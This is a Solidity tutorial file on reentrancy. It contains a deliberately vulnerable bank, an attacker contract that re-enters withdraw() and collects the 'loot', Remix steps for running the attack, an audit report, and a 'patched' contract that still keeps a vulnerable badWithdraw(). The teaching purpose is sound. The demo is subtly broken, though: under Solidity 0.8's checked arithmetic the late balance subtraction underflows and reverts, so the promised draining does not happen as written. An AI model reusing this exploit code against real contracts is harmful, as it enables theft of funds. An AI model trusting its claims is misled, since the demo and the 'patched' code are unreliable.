// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Make external call before state update
CONCEPT: Reentrancy risk
=========================================================

OBJECTIVE

- Learn how reentrancy vulnerabilities happen
- Understand dangerous execution ordering
- Learn why external calls are risky
- Think like attacker + auditor

---------------------------------------------------------
CORE IDEA
---------------------------------------------------------

If external call happens BEFORE state update:

attacker may reenter function
before storage changes occur.

---------------------------------------------------------
IMPORTANT UNDERSTANDING
---------------------------------------------------------

External calls transfer:
execution control outside your contract.

---------------------------------------------------------

Called contract may:
- call back
- manipulate execution
- drain funds
- exploit temporary state

---------------------------------------------------------
WHY THIS MATTERS
---------------------------------------------------------

Reentrancy caused:
one of the most famous hacks in Ethereum history.

---------------------------------------------------------
REAL-WORLD USAGE
---------------------------------------------------------

External calls occur in:

- ETH withdrawals
- token transfers
- staking systems
- vaults
- bridges
- lending protocols

---------------------------------------------------------
AUDITOR FOCUS
---------------------------------------------------------

Auditors inspect:

- external-call ordering
- state-update timing
- reentrancy windows
- CEI violations
- callback attack surface

=========================================================
VULNERABLE CONTRACT
=========================================================
*/

contract VulnerableBankVul {

    /*
        USER BALANCES
    */
    mapping(address => uint256) public balances;

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    */

    function deposit()external payable{
        /*
            Store deposited ETH.
        */
        balances[msg.sender] += msg.value;
    }

    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================

    BAD ORDER:
    external call BEFORE state update.
    */

    function withdraw( uint256 _amount ) external{
        /*
            CHECK:
            user must have balance.
        */
        require(  balances[msg.sender] >= _amount,"Insufficient balance" );
        /*
            DANGEROUS EXTERNAL CALL

            Control leaves contract HERE.
        */
        (bool success, ) = payable(msg.sender).call{    value: _amount }("");
        require( success, "Transfer failed");

        /*
            STATE UPDATED TOO LATE

            Vulnerability exists because:
            attacker can reenter BEFORE this line.
        */
        balances[msg.sender] -= _amount;
    }

    /*
    =====================================================
    CHECK CONTRACT BALANCE
    =====================================================
    */

    function contractBalance() external  view returns (uint256) {
        return address(this).balance;
    }
}

/*
=========================================================
ATTACKER CONTRACT
=========================================================
*/

contract ReentrancyAttackerVul {
    /*
        TARGET CONTRACT
    */
    VulnerableBankVul public target;

    /*
        OWNER
    */
    address public owner;

    /*
        ATTACK COUNTER
    */
    uint256 public attackCounter;

    /*
        LIMIT ATTACK LOOPS
    */
    uint256 public constant MAX_ATTACKS = 3;

    /*
        CONSTRUCTOR
    */
    constructor(address _target) {
        target = VulnerableBankVul(_target);
        owner = msg.sender;
    }

    /*
    =====================================================
    DEPOSIT INTO TARGET
    =====================================================
    */

    function depositToTarget() external payable {

        /*
            Deposit ETH into victim contract.
        */
        target.deposit{value: msg.value}();
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack()   external {
        /*
            Trigger first withdraw.
        */
        target.withdraw(1 ether);
    }

    /*
    =====================================================
    RECEIVE FUNCTION
    =====================================================

    Automatically executes when
    target sends ETH.
    */

    receive()external  payable {
        /*
            Reenter while target still has ETH.
        */
        if ( address(target).balance >= 1 ether && attackCounter < MAX_ATTACKS  ) {
            attackCounter++;

            /*
                REENTER TARGET

                Balance NOT updated yet.
            */
            target.withdraw(1 ether);
        }
    }

    /*
    =====================================================
    WITHDRAW STOLEN ETH
    =====================================================
    */

    function withdrawLoot()external {
        require(  msg.sender == owner, "Not owner" );
        payable(owner).transfer( address(this).balance );
    }
}

/*
=========================================================
EXECUTION FLOW
=========================================================

STEP 1:
Deploy VulnerableBank

---------------------------------------------------------

STEP 2:
Fund VulnerableBank with ETH

=========================================================
STEP 3
=========================================================

Deploy ReentrancyAttacker

Constructor input:
VulnerableBank address

=========================================================
STEP 4
=========================================================

Call:
depositToTarget()

VALUE:
1 ETH

---------------------------------------------------------

Attacker now has:
1 ETH balance in target.

=========================================================
STEP 5
=========================================================

Call:
attack()

=========================================================
CRITICAL EXECUTION TRACE
=========================================================

STEP 1:
target.withdraw(1 ether)

---------------------------------------------------------

Balance check passes.

=========================================================
STEP 2
=========================================================

External call executes:

call{value: 1 ether}()

---------------------------------------------------------

CONTROL LEAVES:
VulnerableBank

---------------------------------------------------------

Execution enters:
Attacker.receive()

=========================================================
STEP 3
=========================================================

Inside receive():

attacker reenters:
target.withdraw(1 ether)

=========================================================
IMPORTANT
=========================================================

Target balance storage:
NOT updated yet.

---------------------------------------------------------

balances[attacker]
still equals:
1 ETH

---------------------------------------------------------

Withdraw succeeds AGAIN.

=========================================================
STEP 4
=========================================================

Attack loops repeatedly.

---------------------------------------------------------

Multiple withdrawals occur
before balance reduction.

=========================================================
FINAL RESULT
=========================================================

Attacker drains ETH
from victim contract.

=========================================================
WHY VULNERABILITY EXISTS
=========================================================

BAD ORDER:

---------------------------------------------------------
INTERACTION
---------------------------------------------------------

External ETH call

BEFORE

---------------------------------------------------------
EFFECTS
---------------------------------------------------------

Storage update

=========================================================
SAFE PATTERN
=========================================================

Checks
    ->
Effects
    ->
Interactions

---------------------------------------------------------

Known as:
CEI pattern.

=========================================================
SAFE VERSION
=========================================================

CORRECT ORDER:

---------------------------------------------------------
STEP 1
---------------------------------------------------------

Validate balance

---------------------------------------------------------
STEP 2
---------------------------------------------------------

Reduce balance FIRST

---------------------------------------------------------
STEP 3
---------------------------------------------------------

Send ETH LAST

=========================================================
SAFE EXAMPLE
=========================================================

function safeWithdraw(uint256 amount)
external
{
    require(
        balances[msg.sender] >= amount
    );

    balances[msg.sender] -= amount;

    (bool success, ) =
        payable(msg.sender).call{
            value: amount
        }("");

    require(success);
}

=========================================================
REMIX TESTING
=========================================================

STEP 1:
Deploy VulnerableBank

---------------------------------------------------------

STEP 2:
Deposit several ETH into bank

---------------------------------------------------------

STEP 3:
Deploy ReentrancyAttacker

Input:
bank address

---------------------------------------------------------

STEP 4:
Call:
depositToTarget()

VALUE:
1 ETH

---------------------------------------------------------

STEP 5:
Call:
attack()

---------------------------------------------------------

STEP 6:
Observe:

Victim ETH balance drops repeatedly.

---------------------------------------------------------

STEP 7:
Call:
attackCounter()

EXPECTED:
multiple attack rounds

=========================================================
VERY IMPORTANT SECURITY CONCEPT
=========================================================

Every external call =
potential reentrancy point.

---------------------------------------------------------

Especially:

- call()
- transfer()
- token callbacks
- fallback()
- receive()

=========================================================
COMMON AUDIT RISKS
=========================================================

---------------------------------------------------------
1. STATE UPDATE AFTER CALL
---------------------------------------------------------

Classic reentrancy vulnerability.

---------------------------------------------------------
2. NESTED EXTERNAL CALLS
---------------------------------------------------------

Complex recursive execution risk.

---------------------------------------------------------
3. CALLBACK ATTACKS
---------------------------------------------------------

Receiver manipulates control flow.

---------------------------------------------------------
4. CROSS-FUNCTION REENTRANCY
---------------------------------------------------------

Different functions abused together.

=========================================================
IMPORTANT ATTACK THINKING
=========================================================

Attackers search for:

- external calls
- delayed state updates
- fallback execution
- recursive entry points

---------------------------------------------------------

Then:
build malicious receiver contracts.

=========================================================
REAL AUDITOR PROCESS
=========================================================

Auditors trace:

1. External interaction timing
2. Storage-update order
3. Reentrancy windows
4. Recursive execution paths
5. ETH transfer flow

=========================================================
HOW AUDITORS FIX THIS
=========================================================

---------------------------------------------------------
FIX 1
---------------------------------------------------------

Use CEI pattern.

---------------------------------------------------------
FIX 2
---------------------------------------------------------

Use ReentrancyGuard.

---------------------------------------------------------
FIX 3
---------------------------------------------------------

Minimize external interactions.

=========================================================
MINI CHALLENGE
=========================================================

Modify contract so that:

1. Add safeWithdraw()
2. Add nonReentrant modifier
3. Compare vulnerable vs safe flow
4. Emit events during attack

BONUS:
Create cross-function reentrancy attack.

=========================================================
IMPORTANT CONCEPTS LEARNED
=========================================================

- External calls transfer execution control
- Reentrancy exploits bad ordering
- State updates after calls are dangerous
- call() creates major attack surface
- receive()/fallback() enable reentry
- CEI pattern improves security
- Reentrancy drains funds recursively
- Auditors inspect every external call
- Execution order is security critical
- Reentrancy is one of Solidity's most important vulnerabilities

=========================================================
*/

/*
=========================================================
AUDIT REPORT
=========================================================

Title: Reentrancy Vulnerability in withdraw()

Severity: Critical

Reason:
External call is executed before state update,
allowing attacker contract to reenter and drain funds.

---------------------------------------------------------
Location
---------------------------------------------------------

Contract: VulnerableBankVul  
Function: withdraw(uint256 _amount)

---------------------------------------------------------
Vulnerability Description
---------------------------------------------------------

The withdraw() function sends ETH to msg.sender using:

(bool success,) = payable(msg.sender).call{value: _amount}("");

BEFORE updating the user’s balance.

This creates a reentrancy window where the attacker
can call withdraw() again before balances are reduced.

---------------------------------------------------------
Impact
---------------------------------------------------------

An attacker can:

- Re-enter withdraw() multiple times
- Withdraw more ETH than deposited
- Drain entire contract balance

This leads to total loss of funds.

---------------------------------------------------------
Proof of Concept
---------------------------------------------------------

        Step 1:
        Attacker deposits 1 ETH into contract.

        Step 2:
        Attacker calls:
        attack()

        Step 3:
        withdraw(1 ether) is executed.

        Step 4:
        ETH is sent BEFORE balance update.

        Step 5:
        Attacker receive() triggers automatically.

        Step 6:
        Attacker re-enters withdraw() again.

        Step 7:
        balances[msg.sender] is still not updated.

        Step 8:
        Multiple withdrawals succeed.

---------------------------------------------------------
Root Cause
---------------------------------------------------------

Incorrect function ordering:

BAD FLOW:
1. External call (call)
2. State update (balances--)

This violates CEI pattern.

---------------------------------------------------------
Correct Pattern (CEI)
---------------------------------------------------------

1. Checks
2. Effects
3. Interactions

---------------------------------------------------------
Recommendation
---------------------------------------------------------

Move state update BEFORE external call.
        OR
Use nonReentrant modifier.
*/
//patched code
contract VulnerableBank {

    /*
        USER BALANCES
    */
    mapping(address => uint256) public balances;


    event Deposit(address indexed user,uint256 amount);
    event Withdraw(address indexed user,uint256 amount);
    

    bool private locked;
    modifier nonReentrant (){
        require(!locked,"Reentrant Attack");
        locked=true;
        _;
        locked=false;
    }

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    */

    function deposit()external payable{
        /*
            Store deposited ETH.
        */
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender,msg.value);
    }


    // safe withdraw
/*
SAFE FLOW

1. Check balance
2. Update balance
3. Send ETH

Reentrancy impossible because
storage changes happen first.
*/
    function safeWithdraw(uint256 amount)external nonReentrant{
        //checks
        require(balances[msg.sender]>=amount,"Insufficient Balance");
        //effects
        balances[msg.sender]-=amount;
        //interactions
        (bool success,)=msg.sender.call{value:amount}("");
        require(success,"Transfer Failed");
        emit Withdraw(msg.sender,amount);
    }
    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================

    BAD ORDER:
    external call BEFORE state update.
    */
/*
VULNERABLE FLOW

1. Check balance
2. Send ETH
3. Update balance

Attacker can reenter before
balance is reduced.
*/

    function badWithdraw( uint256 _amount ) external {
        /*
            CHECK:
            user must have balance.
        */
        require(  balances[msg.sender] >= _amount,"Insufficient balance" );
        /*
            DANGEROUS EXTERNAL CALL

            Control leaves contract HERE.
        */
        (bool success, ) = payable(msg.sender).call{    value: _amount }("");
        require( success, "Transfer failed");

        /*
            STATE UPDATED TOO LATE

            Vulnerability exists because:
            attacker can reenter BEFORE this line.
        */
        balances[msg.sender] -= _amount;
        emit Withdraw(msg.sender,_amount);
    }

    /*
    =====================================================
    CHECK CONTRACT BALANCE
    =====================================================
    */

    function contractBalance() external  view returns (uint256) {
        return address(this).balance;
    }
}

/*
=========================================================
ATTACKER CONTRACT
=========================================================
*/

contract ReentrancyAttacker {
    /*
        TARGET CONTRACT
    */
    VulnerableBank public target;

    /*
        OWNER
    */
    address public owner;

    /*
        ATTACK COUNTER
    */
    uint256 public attackCounter;
     event AttackAttempt(address indexed attacker,uint256 count);

    /*
        LIMIT ATTACK LOOPS
    */
    uint256 public constant MAX_ATTACKS = 3;

    /*
        CONSTRUCTOR
    */
    constructor(address _target) {
        target = VulnerableBank(_target);
        owner = msg.sender;
    }

    /*
    =====================================================
    DEPOSIT INTO TARGET
    =====================================================
    */

    function depositToTarget() external payable {

        /*
            Deposit ETH into victim contract.
        */
        target.deposit{value: msg.value}();
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack()   external {
        /*
            Trigger first withdraw.
        */
        target.badWithdraw(1 ether);
    }

    /*
    =====================================================
    RECEIVE FUNCTION
    =====================================================

    Automatically executes when
    target sends ETH.
    */

    receive()external  payable {
        /*
            Reenter while target still has ETH.
        */
        if ( address(target).balance >= 1 ether && attackCounter < MAX_ATTACKS  ) {
            attackCounter++;
             emit AttackAttempt(address(this), attackCounter);

            /*
                REENTER TARGET

                Balance NOT updated yet.
            */
           target.badWithdraw(1 ether);

        }
    }

    /*
    =====================================================
    WITHDRAW STOLEN ETH
    =====================================================
    */

    function withdrawLoot()external {
        require(  msg.sender == owner, "Not owner" );
        payable(owner).transfer( address(this).balance );
    }
}